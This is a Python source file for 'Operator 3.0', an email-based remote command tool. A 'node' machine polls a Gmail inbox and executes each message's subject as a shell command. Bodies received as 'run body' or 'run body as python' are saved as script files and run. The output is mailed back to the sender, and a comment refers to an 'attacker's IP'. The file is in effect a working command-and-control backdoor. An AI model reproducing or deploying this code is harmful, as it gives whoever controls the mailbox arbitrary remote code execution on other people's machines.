# -*- coding: cp1252 -*-
# imports here
import socket,subprocess
import smtplib
import poplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders
from email import parser
from time import strftime
import os
import platform
import email,imaplib
import sys
import re
import urllib
import time
import threading

from toolbox.Modules.Info_retriever import Info_retriever
from toolbox.Modules.Text_manipulator import Text_manipulator
from toolbox.Modules.Messenger import Messenger
from toolbox.Modules.System_interpreter import System_interpreter
from toolbox.Modules.Logger import Logger
from toolbox.Modules.SQL_agent import SQLite_agent

# Operator 3.0
# Server_provider: Gmail_server (for now..) [if send from email app (not gmail) it don't catch the body of a message

#changelog:
#29/01/16:
#       - from 2.0 to 3.0: defragmented the code into several python modules
#03/02/16:
#       - cleaned entirely Operator.Run()!
#       - compatibility bugs fixed
#19/03/16:
#       - now, when the main loop fail, it save specified log error
#26/04/16:
#       - scroll to the end for a strange error, it fail only the first cycle of run
#02/05/16:
#       - updated, compatible with changes in Messenger.send()
#03/05/16:
#       - new Module: SQL_agent for manipulate sql databases
#07/05/16:
#       - SQL Module: tested, now works under Logger activites
#09/05/16:
#       - SQL_agent need to be tested, error not raised

class Operator(Text_manipulator,Messenger,System_interpreter,Logger, Info_retriever,SQLite_agent): #SQLite_agent
        def __init__(self):

                System_interpreter.__init__(self)
                Info_retriever.__init__(self)
                Text_manipulator.__init__(self)
                
                self.main_dir = os.getcwd()
                self.data_path = self.getScriptPath() + "/Data"
                if not os.path.exists(self.data_path): os.mkdir(self.data_path)

                #SQLite_agent.__init__(self, self.data_path)
                Messenger.__init__(self, self.data_path) #<---
                #Logger.__init__(self, self.data_path)

                self.log_path = self.main_dir + "/Log.txt"
                self.head_status = self.main_dir + "/Head_status.txt"
                self.input_path = self.main_dir + "/Input_file.txt"

                #Default fondamental infos
                self.ID = str(platform.uname()) #ID created from uname info retrieved + (head/node) *3
                #email access
                self.username = ""
                self.password = ""
                self.mail_to = ""
                self.subject = "Operator " + platform.uname()[1] + " report:"
                self.GUI = True

        def getScriptPath(self):
                return os.path.dirname(os.path.realpath(sys.argv[0]))
        
        def sub_logger(self, args):
                self.log_save(args)
                
        def processing(self,code_appender = list(), role = str()):
                txt = "[+] processing start"
                self.log_save(txt)
                for code in code_appender:
                        if role == "node":
                                tokens =  code.Subject.split(" ")
                                #print tokens
                                if tokens[0] == "" or tokens[0] == "node" or tokens[0] == platform.uname()[1]:
                                        i = 0
                                        code.Subject = str()
                                        for tok in tokens:
                                                if i != 0:
                                                        code.Subject += tok
                                                        code.Subject += " "
                                                i += 1
                                        #clean string removing the last space char
                                        code.Subject = code.Subject[:len(code.Subject)-1]
                                else:
                                        continue
                
                        txt = "[<] message received {" + code.Subject + "}\n" + code.Body
                        
                        #if not self.GUI:
                                #print "\n" + txt
                                
                        self.log_save(txt)

                        if role == "node":
                                if code.Subject == "exviemshse":
                                        #self.send(ecc)
                                        
                                        txt = "Halt message sent, Operator service exiting..."
                                        self.send(self.username,self.password,code.From,self.subject,txt)
                                        txt = "[>] message sent to " + code.From + " {" + txt + "}"
                                        self.log_save(txt)
                                        return "exit"
                                
                                if len(code.Subject) >= 12:
                                        if code.Subject[:12] == "run body as ": #not tested 17/1/16
                                                if code.Subject[12:] == "python":
                                                        self.Write_new("python_script.py", code.Body)
                                                        txt = self.command("python python_script.py")
                                                        self.send(self.username,self.password,code.From,self.subject,txt)
                                                        txt = "[>] message sent to " + code.From + " {" + txt + "}"
                                                        self.log_save(txt)
                                                        
                                        elif code.Subject[:13] == "save body as ": #not tested 17/1/16
                                                self.Write_new(reply[13:], code.Body)
                                                txt = "Body saved as " + code.Subject[13:]
                                                self.send(self.username,self.password,code.From,self.subject,txt)
                                                txt = "[>] message sent to " + code.From + " {" + txt + "}"
                                                self.log_save(txt)
                                                
                                if code.Subject == "run body": #not tested 17/1/16
                                        self.Write_new("bash_script.sh", code.Body)
                                        self.command("chmod a+x bash_script.sh")
                                        txt = self.command("./bash_script.sh")
                                        self.send(self.username,self.password, code.From,self.subject,txt)
                                        txt = "[>] message sent to " + code.From + " {" + txt + "}"
                                        self.log_save(txt)
                                if code.Subject[- len("body as args"):] == "body as args": #not tested 09/05/16
                                        txt = self.command(code.Subject + code.Body)
                                        self.send(self.username,self.password,code.From,self.subject,txt)
                                        txt = "[>] message sent to " + code.From + " {" + txt + "}"
                                        self.log_save(txt)                                        

                                else:
                                        txt = self.command(code.Subject)
                                        self.send(self.username,self.password,code.From,self.subject,txt)
                                        txt = "[>] message sent to " + code.From + " {" + txt + "}"
                                        self.log_save(txt)
                        else:
                                pass #if raw_input("[?] continue? [Y/n]: ") == "n": return "exit"
                                
                return "continue"
            
            
                
                
                

        def Run(self, role):

                log_db = "Op_core_default.db"
                SQLite_agent.__init__(self, self.data_path + "/" + log_db)
                
                if role == "node":
                        log_file = "Node_log.txt"
                        self.username = str(self.man_ol_if("SELECT Username FROM Operator WHERE Role = '" + role + "';" )[0][0])#" pythonprompt"
                        self.password = ""
                        self.mail_to = ""
                else:
                        log_file = "Head_log.txt"
                        self.username = ""
                        self.password = ""
                        self.mail_to = ""
                        self.Write_new(self.input_path, "")
                        self.Write_new(self.head_status, "")
                        
                
                self.log_file = self.data_path + "/" + log_file
                self.log_db = self.data_path + "/" + log_db
                Logger.__init__(self, self.data_path, log_file, log_db)
                
                while True:
                        try:
                                txt = "[+] running(pid = " + str(os.getpid()) + ").."
                                self.log_save(txt)
                                
                                while True:
                                        if role == "head":
                                                if not self.sender(): pass
                                                else: pass
                                                
                                        if self.processing(self.receiver(), role) == "exit": break
                                        
                                        else:
                                                pass
                                        
                                exit()
                        except KeyboardInterrupt:
                                exit()

                        except EOFError:
                                exit()
                                
                        except:
                                try:
                                        txt = "[-] error: " + str(sys.exc_info())
                                        self.log_save(txt)#<-- self.log_save() can crash the program cause it is over try except!
                                        time.sleep(10)#wait 10 secs to restart the program
                                        
                                except KeyboardInterrupt:
                                        exit()
                                
                        try:
                                self.remove(self.username,self.password)
                        except:
                                try:
                                        info = sys.exc_info()
                                        txt = "[-] error: " + str(sys.exc_info())
                                        self.log_save(txt)
                                        
                                except KeyboardInterrupt:
                                        exit()
                                
                
if __name__ == "__main__":
        arg = (sys.argv)
        op = Operator()
        op.GUI = False
        if len(arg) == 1:
                arg.append(raw_input("[?] node or head?: "))

        print("""
         .___________________.  O  .___________________.
         | operator________x |  p  | operator________x |
         | I.operator____x.I |  e  | I.operator____x.I |
         | I| Ioperator_x |I |  r  | I| Ioperator_x |I |
         | I| I         I |I |  a  | I| I         I |I |
         | I| I  node   I |I |  t  | I| I  node   I |I |
         | I| I___L_____I |I |  o  | I| I___L_____I |I |
         | I!_______I_____!I |  r  | I!_______I_____!I |
         | I______V________I |  o  | I______V________I |
         !__________E________!  t  !__________E________!
            ._[____S____]_.     a     ._[____S____]_.
         .___|___________|___.  r  .___|___________|___.
         |::: ____           |  e  |::: ____           |
         |    ~~~~ [CD-ROM]  |=====|    ~~~~ [CD-ROM]  |
         !___________________!  p  !___________________!
                \\\              O          //
         .___________________.  p  .___________________.
         | operator________x |  e  | operator________x |
         | I.operator____x.I |  r  | I.operator____x.I |
         | I| Ioperator_x |I |  a  | I| Ioperator_x |I |
         | I| I         I |I |  t  | I| I         I |I |
         | I| I  node   I |I |  o  | I| I  node   I |I |
         | I| I___L_____I |I |  r  | I| I___L_____I |I |
         | I!_______I_____!I |  o  | I!_______I_____!I |
         | I______V________I |  t  | I______V________I |
         !__________E________!  a  !__________E________!
            ._[____S____]_.     r     ._[____S____]_.
         .___|___________|___.  e  .___|___________|___.
         |::: ____           |  p  |::: ____           |
         |    ~~~~ [CD-ROM]  |=====|    ~~~~ [CD-ROM]  |
         !___________________!  O  !___________________!
____________________________________________________________.         
Welcome. This is an Operator's node running on your machine |
Node Status:
        """)
                
        if arg[1] == "node":
                op.Run("node")
        if arg[1] == "head":
                op.Run("head")
        

# to  do:
# 1. get_ID and receive the attacker's IP had to be separated process
# 2. probably better with multithreading
# 6. message_retriever and message display not implemented yet
# 7. after restored the data, if the new mail is the same as the last then remove it 1*
# 8. sketchy 'cause if don't write the Subject but attach a file o something else he retry to receive 2*
# 10. see ex ip retriever 
#Tue Apr 26 20:00:34 2016 [-] error: (<type 'exceptions.NameError'>, NameError("global name 'Message' is not defined",), <traceback object at 0xb66ea698>)
# maybe the "assert" statement can resolve the exception not raise but exited problem
